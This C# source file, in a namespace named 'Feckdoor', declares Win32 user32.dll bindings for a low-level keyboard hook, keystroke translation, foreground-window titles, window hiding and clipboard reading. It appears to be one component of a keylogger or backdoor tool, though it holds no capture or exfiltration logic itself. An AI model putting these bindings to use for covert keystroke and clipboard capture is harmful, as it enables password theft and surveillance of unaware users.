using System.Runtime.InteropServices;
using System.Text;

namespace Feckdoor
{
	public static class User32
	{
		// Constants
		public const int WM_KEYDOWN = 0x0100;
		public const int WM_SYSKEYDOWN = 0x0105;
		public const int WH_KEYBOARD_LL = 13;
		public const int CF_UNICODETEXT = 13;
		public static IntPtr _hookID = IntPtr.Zero;

		// Delegates

		public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);

		/// <summary>
		/// Contains information about a low-level keyboard input event.
		/// https://learn.microsoft.com/ko-kr/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
		/// </summary>
		[StructLayout(LayoutKind.Sequential)]
		public struct KBDLLHOOKSTRUCT
		{
			public uint vkCode;
			public uint scanCode;
			public LLKHF flags;
			public uint time;
			public long dwExtraInfo;
		}

		/// <summary>
		/// https://learn.microsoft.com/ko-kr/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
		/// </summary>
		[Flags]
		public enum LLKHF
		{
			EXTENDED = 1 << 0,
			LOWER_IL_INJECTED = 1 << 1,
			INJECTED = 1 << 4,
			ALTDOWN = 1 << 5,
			UP = 1 << 7
		}

		// Keyboard-related exports

		[DllImport("user32.dll")]
		public static extern short GetAsyncKeyState(Int32 vkey);


		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
		public static extern short GetKeyState(int keyCode);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool GetKeyboardState(byte[] lpKeyState);

		[DllImport("user32.dll")]
		public static extern IntPtr GetKeyboardLayout(uint idThread);

		[DllImport("user32.dll")]
		public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		[DllImport("user32.dll")]
		public static extern uint MapVirtualKey(uint uCode, uint uMapType);

		// Window hook related exports

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);

		// Window-related exports

		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		// Clipboard-related exports
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool OpenClipboard([In, Optional] IntPtr hWnd);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CloseClipboard();

		[DllImport("user32.dll", SetLastError = true)]
		public unsafe static extern int GetPriorityClipboardFormat([In] uint *priorityList, [In] int formats);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetClipboardData([In] uint format);

		[DllImport("user32.dll")]
		public static extern int GetClipboardSequenceNumber();
	}
}
